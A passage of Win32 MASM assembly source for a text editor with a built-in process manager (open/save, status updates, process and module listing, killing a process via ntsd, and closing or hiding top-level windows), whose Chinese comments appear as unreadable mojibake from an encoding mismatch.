		hGoToDialog:HWND,wMsg:DWORD,wParam:DWORD,lParam:DWORD
              local @stRange:CHARRANGE

              invoke RtlZeroMemory,addr @stRange,sizeof CHARRANGE
		mov	eax,wMsg
		.if	eax ==	WM_INITDIALOG

		.elseif  eax == WM_CLOSE
                     invoke EndDialog,hGoToDialog,NULL
                     mov eax,TRUE
                     ret
		.elseif  eax == WM_COMMAND
                     mov eax,wParam
                     .if   ax == IDC_GOTOLINE
                         ;ת��ָ������
                         invoke GetDlgItemInt,hGoToDialog,IDC_LINENUMBER,NULL,FALSE
                         dec eax
                         push eax
                         invoke SendMessage,hWinEdit,EM_LINEINDEX,eax,0
                         mov @stRange.cpMin,eax
                         pop eax
                         inc eax
                         invoke SendMessage,hWinEdit,EM_LINEINDEX,eax,0
                         mov @stRange.cpMax,eax
                         invoke EndDialog,hGoToDialog,NULL
                         invoke SendMessage,hWinEdit,EM_EXSETSEL,0,addr @stRange
                         ;Ҫ�ﵽ����Ч���������ı���ʱ����ʹ��ES_NOHIDESEL
                         invoke SendMessage,hWinEdit,EM_SCROLLCARET,0,0
                         invoke SendMessage,hWinEdit,EM_LINESCROLL,0,-1
                         mov eax,TRUE
                         ret
                     .elseif ax == IDC_LINENUMBER
                         invoke GetDlgItemText,hGoToDialog,IDC_LINENUMBER,addr szBuffer,512
                         invoke lstrlen,addr szBuffer
                         .if eax != 0
                           invoke GetDlgItem,hGoToDialog,IDC_GOTOLINE
                           invoke EnableWindow,eax,TRUE
                         .else
                           invoke GetDlgItem,hGoToDialog,IDC_GOTOLINE
                           invoke EnableWindow,eax,FALSE
                         .endif
			.elseif  ax == IDC_CANCLE
				invoke	EndDialog,hGoToDialog,NULL
                          	mov eax,TRUE
                           ret
			.endif
		.else
			mov	eax,FALSE
			ret
		.endif
		mov	eax,TRUE
		ret

_GoToMain      endp


;------------------------------
; ���ݲ�ͬ�Ĳ�����ʾ��ͬ�����
;------------------------------
_SetStatus	proc
		local	@stRange:CHARRANGE
		local	@dwLines,@dwLine,@dwLineStart
		local	@szBuffer[256]:byte


              ; ��״̬����ʾ�С�����Ϣ
		invoke	SendMessage,hWinEdit,EM_GETLINECOUNT,0,0
		invoke	wsprintf,addr @szBuffer,addr sz1,eax
		invoke	SendMessage,hWinStatus,SB_SETTEXT,2,addr @szBuffer
		invoke	SendMessage,hWinEdit,EM_EXGETSEL,0,addr @stRange
		invoke	SendMessage,hWinEdit,EM_EXLINEFROMCHAR,0,-1
		mov	@dwLine,eax
		inc	@dwLine

		invoke	SendMessage,hWinEdit,EM_LINEINDEX,eax,0
		mov	ecx,@stRange.cpMin
		sub	ecx,eax
		inc	ecx
		invoke	wsprintf,addr @szBuffer,addr sz2,@dwLine,ecx
		invoke	SendMessage,hWinStatus,SB_SETTEXT,3,addr @szBuffer

                ;�����Ƿ���ѡ�������趨���ƺͼ���
		mov	eax,@stRange.cpMin
		.if	eax ==	@stRange.cpMax
			invoke	EnableMenuItem,hMenu,IDM_COPY,MF_GRAYED
			invoke	EnableMenuItem,hMenu,IDM_CUT,MF_GRAYED
			invoke	SendMessage,hWinToolbar,TB_ENABLEBUTTON,IDM_COPY,FALSE
			invoke	SendMessage,hWinToolbar,TB_ENABLEBUTTON,IDM_CUT,FALSE
		.else
			invoke	EnableMenuItem,hMenu,IDM_COPY,MF_ENABLED
			invoke	EnableMenuItem,hMenu,IDM_CUT,MF_ENABLED
			invoke	SendMessage,hWinToolbar,TB_ENABLEBUTTON,IDM_COPY,TRUE
			invoke	SendMessage,hWinToolbar,TB_ENABLEBUTTON,IDM_CUT,TRUE
		.endif
                ;���ݼ��а��Ƿ����ı���������ճ��
		invoke	IsClipboardFormatAvailable,CF_TEXT
		.if	eax
			invoke	EnableMenuItem,hMenu,IDM_PASTE,MF_ENABLED
			invoke	SendMessage,hWinToolbar,TB_ENABLEBUTTON,IDM_PASTE,TRUE
		.else
			invoke	EnableMenuItem,hMenu,IDM_PASTE,MF_GRAYED
			invoke	SendMessage,hWinToolbar,TB_ENABLEBUTTON,IDM_PASTE,FALSE
		.endif
                ;���������ͳ���
		invoke	SendMessage,hWinEdit,EM_CANREDO,0,0
		.if	eax
			invoke	EnableMenuItem,hMenu,IDM_REDO,MF_ENABLED
			invoke	SendMessage,hWinToolbar,TB_ENABLEBUTTON,IDM_REDO,TRUE
		.else
			invoke	EnableMenuItem,hMenu,IDM_REDO,MF_GRAYED
			invoke	SendMessage,hWinToolbar,TB_ENABLEBUTTON,IDM_REDO,FALSE
		.endif
		invoke	SendMessage,hWinEdit,EM_CANUNDO,0,0
		.if	eax
			invoke	EnableMenuItem,hMenu,IDM_UNDO,MF_ENABLED
			invoke	SendMessage,hWinToolbar,TB_ENABLEBUTTON,IDM_UNDO,TRUE
		.else
			invoke	EnableMenuItem,hMenu,IDM_UNDO,MF_GRAYED
			invoke	SendMessage,hWinToolbar,TB_ENABLEBUTTON,IDM_UNDO,FALSE
		.endif
                ;����������������ȫѡ
		invoke	GetWindowTextLength,hWinEdit
		.if	eax
			invoke	EnableMenuItem,hMenu,IDM_SELALL,MF_ENABLED
		.else
			invoke	EnableMenuItem,hMenu,IDM_SELALL,MF_GRAYED
		.endif
                ;�������������޸�ȷ�����水ť�Ƿ���Ч
		invoke	SendMessage,hWinEdit,EM_GETMODIFY,0,0
		.if	eax
			invoke	EnableMenuItem,hMenu,IDM_SAVE,MF_ENABLED
			invoke	SendMessage,hWinToolbar,TB_ENABLEBUTTON,IDM_SAVE,TRUE
		.else
			invoke	EnableMenuItem,hMenu,IDM_SAVE,MF_GRAYED
			invoke	SendMessage,hWinToolbar,TB_ENABLEBUTTON,IDM_SAVE,FALSE
		.endif
                ;�����Ƿ��ҵ�Ҫ���ҵ����������ϲ飬�²�
		.if	szFindText
			invoke	EnableMenuItem,hMenu,IDM_FINDNEXT,MF_ENABLED
			invoke	EnableMenuItem,hMenu,IDM_FINDPREV,MF_ENABLED
			invoke	SendMessage,hWinToolbar,TB_ENABLEBUTTON,IDM_FINDNEXT,TRUE
			invoke	SendMessage,hWinToolbar,TB_ENABLEBUTTON,IDM_FINDPREV,TRUE
		.else
			invoke	EnableMenuItem,hMenu,IDM_FINDNEXT,MF_GRAYED
			invoke	EnableMenuItem,hMenu,IDM_FINDPREV,MF_GRAYED
			invoke	SendMessage,hWinToolbar,TB_ENABLEBUTTON,IDM_FINDNEXT,FALSE
			invoke	SendMessage,hWinToolbar,TB_ENABLEBUTTON,IDM_FINDPREV,FALSE
		.endif


                ret
_SetStatus      endp
;-------------
; �ı�������
;-------------
_ProcStream	proc uses ebx edi esi _dwCookie,_lpBuffer,_dwBytes,_lpBytes
		.if	_dwCookie
			invoke	ReadFile,hFile,_lpBuffer,_dwBytes,_lpBytes,0
		.else
			invoke	WriteFile,hFile,_lpBuffer,_dwBytes,_lpBytes,0
		.endif

		xor	eax,1
		ret
_ProcStream	endp

;-----------------------------------------
; ����ı��Ƿ�ı䣬���������������TRUE
;-----------------------------------------
_CheckModify	proc

		invoke	SendMessage,hWinEdit,EM_GETMODIFY,0,0
		.if	eax
			invoke	MessageBox,hWinMain,addr szModify,addr szCaptionMain,\
				MB_YESNOCANCEL or MB_ICONQUESTION
			.if	eax ==	IDYES
                                .if fIsNewDoc  ;�ļ���δ����
                                   call _SaveAs
                                .else
   				   call _SaveFile
                                .endif
			.elseif	eax ==	IDNO
				mov	eax,TRUE
			.elseif	eax ==	IDCANCEL
				xor	eax,eax
			.endif
		.else
			mov	eax,TRUE
		.endif
		ret
_CheckModify	endp

;------------------------------------------
; �����ļ������û�д����½�һ��
;------------------------------------------
_SaveFile    proc
	     local @stES:EDITSTREAM
 
             .if fIsNewDoc  ;�����ļ�
                call _SaveAs
             .else                
                invoke CreateFile,addr szFileNameOpen,GENERIC_WRITE,\
                       FILE_SHARE_READ,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0
                .if eax!=INVALID_HANDLE_VALUE
                   mov hFile,eax
                   mov @stES.dwCookie,FALSE
                   mov @stES.pfnCallback,offset _ProcStream
		   invoke  SendMessage,hWinEdit,EM_STREAMOUT,SF_TEXT,addr @stES
		   invoke  SendMessage,hWinEdit,EM_SETMODIFY,FALSE,0
                   invoke  CloseHandle,hFile
		   mov	eax,TRUE
                 .else
                   invoke MessageBox,hWinMain,addr szErrOpenFile,addr szCaptionMain,MB_OK or MB_ICONERROR
                   mov eax,FALSE
                 .endif
               .endif

               ret
_SaveFile	endp

;------------------------------
; �ļ�����
;------------------------------
_FileCopy   proc   _lpSource,_lpDest
            invoke CopyFile,_lpSource,_lpDest,FALSE
            ret
_FileCopy   endp
;------------------------------------------
; ����ļ�
;------------------------------------------
_SaveAs		proc
		local	@stOF:OPENFILENAME
		local	@stES:EDITSTREAM

                ;������ǰ�����ļ�������ڣ����ȹر��ٸ�ֵ                
                .if hFile
                   invoke CloseHandle,hFile
                   mov hFile,0
                .endif
		invoke	RtlZeroMemory,addr @stOF,sizeof @stOF
                ; ��ʾ�������ļ����Ի���
		mov	@stOF.lStructSize,sizeof @stOF
		push	hWinMain
		pop	@stOF.hwndOwner
                push    hInstance
                pop     @stOF.hInstance
		mov	@stOF.lpstrFilter,offset szFilter1
		mov	@stOF.lpstrFile,offset szFileNameOpen
		mov	@stOF.nMaxFile,MAX_PATH
		mov	@stOF.Flags,OFN_PATHMUSTEXIST or\
                                    OFN_HIDEREADONLY or OFN_PATHMUSTEXIST
		mov	@stOF.lpstrDefExt,offset szDefExt
		mov	@stOF.lpstrTitle,offset szSaveCaption
		invoke	GetSaveFileName,addr @stOF

		.if	eax
                        ; �������ļ�
			invoke	CreateFile,addr szFileNameOpen,GENERIC_WRITE,\
				FILE_SHARE_READ,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0
			.if	eax !=	INVALID_HANDLE_VALUE
				mov	hFile,eax
                                mov @stES.dwCookie,FALSE
                                mov @stES.pfnCallback,offset _ProcStream
		                invoke  SendMessage,hWinEdit,EM_STREAMOUT,SF_TEXT,addr @stES
		                invoke  SendMessage,hWinEdit,EM_SETMODIFY,FALSE,0
                                invoke  CloseHandle,hFile
		                mov     eax,TRUE
                        .else
                                invoke MessageBox,hWinMain,addr szErrCreateFile,\
                                        addr szCaptionMain,MB_OK or MB_ICONERROR
                                mov eax,FALSE
                        .endif
                        call	_SetCaption
			call	_SetStatus
			mov	eax,TRUE
			ret
		.endif
		mov	eax,FALSE
		ret
_SaveAs		endp


;------------------------------------------
; �������ļ�
;------------------------------------------
_OpenFile	proc
		local	@stOF:OPENFILENAME
		local	@stES:EDITSTREAM

                ;�����֮ǰ�����ļ�������ڣ����ȹر��ٸ�ֵ                
                .if hFile
                   invoke CloseHandle,hFile
                   mov hFile,0
                .endif
                ; ��ʾ�����ļ����Ի���
		invoke	RtlZeroMemory,addr @stOF,sizeof @stOF
		mov	@stOF.lStructSize,sizeof @stOF
		push	hWinMain
		pop	@stOF.hwndOwner
                push    hInstance
                pop     @stOF.hInstance
		mov	@stOF.lpstrFilter,offset szFilter1
		mov	@stOF.lpstrFile,offset szFileNameOpen
		mov	@stOF.nMaxFile,MAX_PATH
		mov	@stOF.Flags,OFN_FILEMUSTEXIST or\
                                    OFN_HIDEREADONLY or OFN_PATHMUSTEXIST
		invoke	GetOpenFileName,addr @stOF
		.if	eax
                        ; �����ļ�
			invoke	CreateFile,addr szFileNameOpen,GENERIC_READ,\
				FILE_SHARE_READ,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0
			.if	eax ==	INVALID_HANDLE_VALUE
				invoke	MessageBox,hWinMain,addr szErrOpenFile,NULL,MB_OK or MB_ICONSTOP
				ret
			.endif
			mov	hFile,eax

                        ; �����ļ�
			mov	@stES.dwCookie,TRUE
			mov	@stES.pfnCallback,offset _ProcStream
			invoke	SendMessage,hWinEdit,EM_STREAMIN,SF_TEXT,addr @stES
			invoke	SendMessage,hWinEdit,EM_SETMODIFY,FALSE,0
                        invoke  CloseHandle,hFile
			call	_SetCaption
			call	_SetStatus
		.endif
		ret

_OpenFile	endp


;------------------------------------------
; ��ָ���ļ����������ļ�
; �ļ������ڻ�����ΪszFileNameOpen
;------------------------------------------
_OpenFileAsName	proc
		local	@stES:EDITSTREAM

              call _CheckModify

              ;�����֮ǰ�����ļ�������ڣ����ȹر��ٸ�ֵ                
              .if hFile
                 invoke CloseHandle,hFile
                 mov hFile,0
              .endif
              ; �����ļ�
              invoke CreateFile,addr szFileNameOpen,GENERIC_READ,\
				FILE_SHARE_READ,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0
		.if  eax ==  INVALID_HANDLE_VALUE
                  invoke MessageBox,hWinMain,addr szErrOpenFile,NULL,MB_OK or MB_ICONSTOP
                  ret
              .endif
		mov	hFile,eax

              ; �����ļ�
		mov	@stES.dwCookie,TRUE
		mov	@stES.pfnCallback,offset _ProcStream
		invoke	SendMessage,hWinEdit,EM_STREAMIN,SF_TEXT,addr @stES
		invoke	SendMessage,hWinEdit,EM_SETMODIFY,FALSE,0
              invoke  CloseHandle,hFile
		call	_SetCaption
		call	_SetStatus
		ret
_OpenFileAsName	endp

;-------------------------
; ���ô��ڱ���
;-------------------------
_SetCaption	proc
		local	@szBuffer[1024]:byte

		.if	szFileNameOpen
			mov	eax,offset szFileNameOpen
		.else
			mov	eax,offset szNoName
		.endif
		invoke	wsprintf,addr @szBuffer,addr szTitleFormat,eax
		invoke	SetWindowText,hWinMain,addr @szBuffer
		ret

_SetCaption	endp


;----------------------------
; ִ�н������̵ĳ���
; ����Ϊ��ntsd
; ����Ϊ��-c q -p PID
;----------------------------
_RunThread	proc	uses ebx ecx edx esi edi,\
		dwParam:DWORD

              invoke  wsprintf,addr szPID,addr szFmtHexToDec,dwParam

              invoke GetStartupInfo,addr stStartUp
		invoke	CreateProcess,NULL,addr szProcessFileName,NULL,NULL,\
			NULL,NORMAL_PRIORITY_CLASS,NULL,NULL,offset stStartUp,offset stProcInfo
		.if	eax !=	0
			invoke	WaitForSingleObject,stProcInfo.hProcess,INFINITE
			invoke	CloseHandle,stProcInfo.hProcess
			invoke	CloseHandle,stProcInfo.hThread
		.else
			invoke	MessageBox,hWinMain,addr szExecuteError,NULL,MB_OK or MB_ICONERROR
		.endif

		ret

_RunThread	endp
;-----------------------
; ��ȡָ�����̹���ģ���б�
;-----------------------
_GetModuleList proc uses ebx esi edi processID:DWORD
          local temp:BOOL

          invoke SendMessage,hModuleShowList,LB_RESETCONTENT,0,0
          mov ebx,processID
          invoke CreateToolhelp32Snapshot,TH32CS_SNAPMODULE,ebx
          mov hModuleSnapshot,eax
          invoke Module32First,hModuleSnapshot,addr process_ME

          mov temp,eax
          .while temp
             .if process_ME.th32ProcessID==ebx
                 invoke SendMessage,hModuleShowList,LB_ADDSTRING,\
                       0,addr process_ME.szExePath
             .endif
             invoke Module32Next,hModuleSnapshot,addr process_ME
             mov temp,eax
          .endw
          ret
_GetModuleList endp
          
;-----------------------
; ��ȡ�����б�
;-----------------------
_GetProcessList   proc   _hWnd
          local temp:BOOL

          invoke RtlZeroMemory,addr process_PE,sizeof process_PE
          invoke SendMessage,hProcessListBox,LB_RESETCONTENT,0,0
          mov process_PE.dwSize,sizeof process_PE
          invoke CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,0
          mov hProcessSnapshot,eax
          
          invoke Process32First,hProcessSnapshot,addr process_PE
          .while eax
              invoke SendMessage,hProcessListBox,LB_ADDSTRING,\
                     0,addr process_PE.szExeFile
              invoke SendMessage,hProcessListBox,LB_SETITEMDATA,eax,\
                     process_PE.th32ProcessID
              invoke Process32Next,hProcessSnapshot,addr process_PE
          .endw
          invoke CloseHandle,hProcessSnapshot
          ;ѡ�е�һ��
          invoke SendMessage,hProcessListBox,LB_SETCURSEL,0,0          
          invoke SendMessage,hProcessListBox,LB_GETITEMDATA,eax,0
          invoke _GetModuleList,eax

          invoke GetDlgItem,_hWnd,IDOK
          invoke EnableWindow,eax,FALSE
          ret
_GetProcessList endp
;--------------------------
; �������̴��ڳ���
;--------------------------
_ProcKillMain   proc  uses ebx edi esi hProcessKillDlg:HWND,wMsg,wParam,lParam
          mov eax,wMsg

          .if eax==WM_CLOSE
             invoke EndDialog,hProcessKillDlg,NULL
          .elseif eax==WM_INITDIALOG
             invoke GetDlgItem,hProcessKillDlg,IDC_PROCESS
             mov hProcessListBox,eax
             invoke GetDlgItem,hProcessKillDlg,IDC_PROCESS_MODEL
             mov hModuleShowList,eax
             ;��ʾ���̣����ѵ�һ����̵�ӳ��ģ��Ҳ��ʾ����
             invoke _GetProcessList,hProcessKillDlg 
          .elseif eax==WM_COMMAND
             mov eax,wParam
             .if ax==IDOK
                 invoke SendMessage,hProcessListBox,LB_GETCURSEL,0,0
                 invoke SendMessage,hProcessListBox,\
                        LB_GETITEMDATA,eax,0

                 invoke _RunThread,eax

                 invoke Sleep,200
                 invoke _GetProcessList,hProcessKillDlg
                 jmp @F
                 invoke MessageBox,hProcessKillDlg,addr szErrTerminate,\
                      NULL,MB_OK or MB_ICONWARNING
                 @@:
             .elseif ax==IDC_REFRESH
                 invoke SendMessage,hProcessListBox,LB_RESETCONTENT,0,0
                 invoke CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,0

                 mov hProcessSnapshot,eax
                 invoke _GetProcessList,hProcessKillDlg
             .elseif ax==IDC_PROCESS
                 shr eax,16
                 .if ax==LBN_SELCHANGE
                     invoke SendMessage,hProcessListBox,LB_GETCURSEL,0,0
                     invoke SendMessage,hProcessListBox,LB_GETITEMDATA,\
                         eax,0
                     invoke _GetModuleList,eax ;������ʾӳ���ģ��
                     invoke GetDlgItem,hProcessKillDlg,IDOK
                     invoke EnableWindow,eax,TRUE
                 .endif
             .endif
         .else
             mov eax,FALSE
             ret
         .endif
         mov eax,TRUE
         ret
_ProcKillMain    endp

;-------------------------
; ��ListView������һ����
; ���룺_dwColumn = ���ӵ��б��
;	_dwWidth = �еĿ��
;	_lpszHead = �еı����ַ��� 
;-------------------------
_ListViewAddColumn	proc  uses ebx ecx _hWinView,_dwColumn,_dwWidth,_lpszHead
		local	@stLVC:LV_COLUMN

		invoke	RtlZeroMemory,addr @stLVC,sizeof LV_COLUMN
		mov	@stLVC.imask,LVCF_TEXT or LVCF_WIDTH or LVCF_FMT
		mov	@stLVC.fmt,LVCFMT_LEFT
		push	_lpszHead
		pop	@stLVC.pszText
		push	_dwWidth
		pop	@stLVC.lx
              push  _dwColumn
              pop   @stLVC.iSubItem
		invoke	SendMessage,_hWinView,LVM_INSERTCOLUMN,_dwColumn,addr @stLVC
		ret
_ListViewAddColumn	endp
;----------------------------------------------------------------------
; ��ListView������һ�У����޸�һ����ĳ���ֶε�����
; ���룺_dwItem = Ҫ�޸ĵ��еı��
;	_dwSubItem = Ҫ�޸ĵ��ֶεı�ţ�-1��ʾ�����µ��У�>=1��ʾ�ֶεı��
;-----------------------------------------------------------------------
_ListViewSetItem	proc uses ebx ecx _hWinView,_dwItem,_dwSubItem,_lpszText
		invoke	RtlZeroMemory,addr stLVI,sizeof LV_ITEM

              invoke lstrlen,_lpszText
              mov stLVI.cchTextMax,eax
              mov stLVI.imask,LVIF_TEXT
              push _lpszText
              pop stLVI.pszText
              push _dwItem
              pop stLVI.iItem
              push _dwSubItem
              pop stLVI.iSubItem

              .if _dwSubItem == -1
                 mov stLVI.iSubItem,0
                 invoke SendMessage,_hWinView,LVM_INSERTITEM,NULL,addr stLVI
		.else
                 invoke SendMessage,_hWinView,LVM_SETITEM,NULL,addr stLVI
		.endif
              
		ret

_ListViewSetItem	endp
;----------------------
; ���ListView�е�����
; ɾ�����е��к����е���
;----------------------
_ListViewClear	proc uses ebx ecx _hWinView

		invoke	SendMessage,_hWinView,LVM_DELETEALLITEMS,0,0
		.while	TRUE
			invoke	SendMessage,_hWinView,LVM_DELETECOLUMN,0,0
			.break	.if ! eax
		.endw
		ret

_ListViewClear	endp

;---------------------
; ����ָ�����е�ֵ
; �����szBuffer��
;---------------------
_GetListViewItem   proc  _hWinView:DWORD,_dwLine:DWORD,_dwCol:DWORD,_lpszText
              local @stLVI:LV_ITEM
              
		invoke	RtlZeroMemory,addr @stLVI,sizeof LV_ITEM
              invoke RtlZeroMemory,_lpszText,512

              mov  @stLVI.cchTextMax,512
              mov  @stLVI.imask,LVIF_TEXT
              push   _lpszText
              pop  @stLVI.pszText
              push _dwCol
              pop  @stLVI.iSubItem

              invoke SendMessage,_hWinView,LVM_GETITEMTEXT,_dwLine,addr @stLVI
              ret
_GetListViewItem   endp


_EnumProc proc hTopWinWnd:DWORD,value:DWORD
      invoke GetClassName,hTopWinWnd,addr szClassNameBuf,\  ;����
            sizeof szClassNameBuf
      invoke GetWindowText,hTopWinWnd,addr szWndTextBuf,\  ;������
            sizeof szWndTextBuf
      invoke wsprintf,addr szBuffer,addr szTopWinFmt,hTopWinWnd
      ;�ڱ��������һ��
      invoke _ListViewSetItem,hProcessWinTable,dwCount,-1,0
      mov dwCount,eax
      xor ebx,ebx
      invoke _ListViewSetItem,hProcessWinTable,dwCount,ebx,\
             addr szBuffer
      inc ebx
      invoke _ListViewSetItem,hProcessWinTable,dwCount,ebx,\
             addr szClassNameBuf
      inc ebx
      invoke _ListViewSetItem,hProcessWinTable,dwCount,ebx,\
             addr szWndTextBuf
      inc dwCount

      mov eax,hTopWinWnd ;�����ھ��Ϊ��ʱ����
      ret 
_EnumProc endp
;--------------------------
; ���̹���-��������֮���ڳ���
;--------------------------
_ProcTopWinMain   proc  uses ebx edi esi hProcessTWDlg:HWND,wMsg,wParam,lParam
          mov eax,wMsg

          .if eax==WM_CLOSE
             invoke EndDialog,hProcessTWDlg,NULL
          .elseif eax==WM_INITDIALOG
             invoke GetDlgItem,hProcessTWDlg,IDC_WINTABLE
             mov hProcessWinTable,eax
             invoke SendMessage,hProcessWinTable,LVM_SETEXTENDEDLISTVIEWSTYLE,\
                    0,LVS_EX_GRIDLINES or LVS_EX_FULLROWSELECT
             invoke ShowWindow,hProcessWinTable,SW_SHOW

             ;��ӱ�ͷ
             mov ebx,1
             mov eax,100
             lea ecx,szColName1
             invoke _ListViewAddColumn,hProcessWinTable,ebx,eax,ecx

             mov ebx,2
             mov eax,200
             lea ecx,szColName2
             invoke _ListViewAddColumn,hProcessWinTable,ebx,eax,ecx

             mov ebx,3
             mov eax,250
             lea ecx,szColName3
             invoke _ListViewAddColumn,hProcessWinTable,ebx,eax,ecx

             mov dwCount,0
             invoke EnumWindows,addr _EnumProc,NULL  ;ö�ٶ��㴰��

          .elseif eax==WM_COMMAND
             mov eax,wParam
             .if ax==IDC_CLOSEWIN  ;�رն�������
                invoke _GetListViewItem,hProcessWinTable,dwTopWinLineIndex,1,\
                        addr szClassNameBuf
                invoke _GetListViewItem,hProcessWinTable,dwTopWinLineIndex,2,\
                        addr szWndTextBuf
                invoke FindWindow,addr szClassNameBuf,addr szWndTextBuf
                invoke PostMessage,eax,WM_CLOSE,0,0
             .elseif ax==IDC_TOPWINSHOW  ;��ʾָ������
                invoke _GetListViewItem,hProcessWinTable,dwTopWinLineIndex,1,\
                        addr szClassNameBuf
                invoke _GetListViewItem,hProcessWinTable,dwTopWinLineIndex,2,\
                        addr szWndTextBuf
                invoke FindWindow,addr szClassNameBuf,addr szWndTextBuf
                invoke ShowWindow,eax,SW_RESTORE
             .elseif ax==IDC_TOPWINHIDE  ;����ָ������
                invoke _GetListViewItem,hProcessWinTable,dwTopWinLineIndex,1,\
                        addr szClassNameBuf
                invoke _GetListViewItem,hProcessWinTable,dwTopWinLineIndex,2,\
                        addr szWndTextBuf
                invoke FindWindow,addr szClassNameBuf,addr szWndTextBuf
                invoke ShowWindow,eax,SW_HIDE
             .elseif ax==IDC_REFRESHW  ;ˢ����ʾ
               invoke _ListViewClear,hProcessWinTable
               ;��ӱ�ͷ
               mov ebx,1
               mov eax,100
               lea ecx,szColName1
               invoke _ListViewAddColumn,hProcessWinTable,ebx,eax,ecx

               mov ebx,2
               mov eax,200
               lea ecx,szColName2
               invoke _ListViewAddColumn,hProcessWinTable,ebx,eax,ecx

               mov ebx,3
               mov eax,250
               lea ecx,szColName3
               invoke _ListViewAddColumn,hProcessWinTable,ebx,eax,ecx

               mov dwCount,0
               invoke EnumWindows,addr _EnumProc,NULL  ;ö�ٶ��㴰��
             .endif
         .elseif eax==WM_NOTIFY   ;����ؼ������ĸ���֪ͨ��
            mov eax,lParam
            mov ebx,lParam
            ;���ĸ��ؼ�״̬
            mov eax,[eax+NMHDR.hwndFrom]
            .if eax==hProcessWinTable
                mov ebx,lParam
                .if [ebx+NMHDR.code]==LVN_ITEMACTIVATE  ;˫���з��ͽ�����Ϣ
                    assume ebx:ptr NMLISTVIEW
                    mov eax,[ebx].iItem
                    mov ecx,[ebx].iSubItem
                    invoke _GetListViewItem,hProcessWinTable,eax,1,\
                            addr szClassNameBuf
                    mov eax,[ebx].iItem
                    invoke _GetListViewItem,hProcessWinTable,eax,2,\
                            addr szWndTextBuf
                    invoke FindWindow,addr szClassNameBuf,addr szWndTextBuf
                    invoke PostMessage,eax,WM_CLOSE,0,0
                .elseif [ebx+NMHDR.code]==NM_CLICK
                    assume ebx:ptr NMLISTVIEW
                    mov eax,[ebx].iItem
                    mov dwTopWinLineIndex,eax
                    invoke _GetListViewItem,hProcessWinTable,eax,1,\
                            addr szClassNameBuf
                    mov eax,[ebx].iItem
                    invoke _GetListViewItem,hProcessWinTable,eax,2,\
                            addr szWndTextBuf

                    invoke GetDlgItem,hProcessTWDlg,IDC_CLOSEWIN
                    invoke EnableWindow,eax,TRUE
                .endif
            .endif
         .else
             mov eax,FALSE
             ret
         .endif
         mov eax,TRUE
         ret
_ProcTopWinMain    endp


;--------------------------------------------
; �о�ģ�� 
; ����ΪTRUE��ʾ��ǰ��ѡ�е���Ŀ��������ʾ��һ��ģ��Ĺ�������
;--------------------------------------------
_ModuleNameList proc uses edi Entry:DWORD
   local tempProcess:DWORD
   local tempModule:DWORD
   local tempBuffer[50]:byte

   invoke Process32First,hProcessSnapshot1,addr process_PE
   mov tempProcess,eax
   .while tempProcess
      invoke CreateToolhelp32Snapshot,TH32CS_SNAPMODULE,process_PE.th32ProcessID
      mov hModuleSnapshot1,eax
      invoke Module32First,hModuleSnapshot1,addr process_ME
      mov tempModule,eax
      .while tempModule
         .if !Entry
            invoke SendMessage, hModuleListBox,LB_FINDSTRINGEXACT,-1,\
                         addr process_ME.szModule 
            .if eax==LB_ERR ;�б����û�ҵ���Ӧ��ģ������
               invoke SendMessage, hModuleListBox,LB_ADDSTRING,0,\
                         addr process_ME.szModule 
            .endif
         .else
            invoke SendMessage,hModuleListBox,LB_GETCURSEL,0,0
            mov edi,eax
            invoke SendMessage,hModuleListBox,LB_GETTEXT,edi,addr tempBuffer
            invoke lstrcmpi,addr tempBuffer,addr process_ME.szModule 
            .if  !eax
               ;��ʼ��������,ע�⣺�����˱��˵ģ������Ͽ���������
               invoke RtlZeroMemory,addr szBuffer,512
               invoke RtlZeroMemory,addr szClassNameBuf,512
               invoke RtlZeroMemory,addr szWndTextBuf,512
               invoke wsprintf,addr szBuffer,addr szTopWinFmt,\
                      process_PE.th32ProcessID
               invoke wsprintf,addr szClassNameBuf,addr szTopWinFmt,\
                      process_ME.modBaseAddr
               invoke wsprintf,addr szWndTextBuf,addr szRun,\
                      addr process_PE.szExeFile
               
               ;��ӽ����
               ;�ڱ��������һ��
               invoke _ListViewSetItem,hProcessModuleTable,dwCount,-1,0
               mov dwCount,eax
               xor ebx,ebx
               invoke _ListViewSetItem,hProcessModuleTable,dwCount,ebx,\
                      addr szBuffer
               inc ebx
               invoke _ListViewSetItem,hProcessModuleTable,dwCount,ebx,\
                      addr szClassNameBuf
               inc ebx
               invoke _ListViewSetItem,hProcessModuleTable,dwCount,ebx,\
                      addr szWndTextBuf
               inc dwCount
            .endif
         .endif   
         invoke Module32Next,hModuleSnapshot1,addr process_ME
         mov tempModule,eax
      .endw
      invoke Process32Next,hProcessSnapshot1,addr process_PE
      mov tempProcess,eax   
   .endw
   ret
_ModuleNameList endp

_clearModuleView  proc uses ebx ecx

               invoke _ListViewClear,hProcessModuleTable
               ;��ӱ�ͷ
               mov ebx,1
               mov eax,100
               lea ecx,szMColName1
               invoke _ListViewAddColumn,hProcessModuleTable,ebx,eax,ecx

               mov ebx,2
               mov eax,100
               lea ecx,szMColName2
               invoke _ListViewAddColumn,hProcessModuleTable,ebx,eax,ecx

               mov ebx,3
               mov eax,180
               lea ecx,szMColName3
               invoke _ListViewAddColumn,hProcessModuleTable,ebx,eax,ecx

               mov dwCount,0
               ret
_clearModuleView  endp

_refreshModuleTable  proc
               invoke _clearModuleView

               invoke SendMessage,hModuleListBox,LB_RESETCONTENT,0,0  

               invoke CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,0
               mov hProcessSnapshot1,eax
               invoke _ModuleNameList,FALSE
               invoke SendMessage,hModuleListBox,LB_SETCURSEL,0,0
               invoke _ModuleNameList,TRUE
               ret
_refreshModuleTable  endp
;--------------------------
; ���̹���-ģ������̹���֮���ڳ���
;--------------------------
_ProcModuleMain   proc  uses ebx edi esi hProcessModuleDlg:HWND,wMsg,wParam,lParam
          mov eax,wMsg

          .if eax==WM_CLOSE
             invoke EndDialog,hProcessModuleDlg,NULL
          .elseif eax==WM_INITDIALOG
             invoke GetDlgItem,hProcessModuleDlg,IDC_MODULELIST
             mov hModuleListBox,eax
             invoke GetDlgItem,hProcessModuleDlg,IDC_MODULETABLE
             mov hProcessModuleTable,eax
             invoke SendMessage,hProcessModuleTable,LVM_SETEXTENDEDLISTVIEWSTYLE,\
                    0,LVS_EX_GRIDLINES or LVS_EX_FULLROWSELECT
